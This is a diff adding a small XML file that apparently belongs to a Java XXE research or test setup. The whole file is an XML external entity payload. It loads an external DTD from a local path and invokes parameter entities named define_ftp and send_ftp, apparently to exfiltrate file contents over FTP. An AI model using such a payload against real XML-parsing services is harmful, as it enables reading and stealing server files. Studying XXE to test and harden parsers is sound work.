@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE xdsec[
+        <!ENTITY % include SYSTEM "file:///Users/leadroyal/Java_code/java_xxe_2019/d2_step2.dtd" >
+        %include;
+        %define_ftp;%send_ftp;
+        ]>
+<books></books>
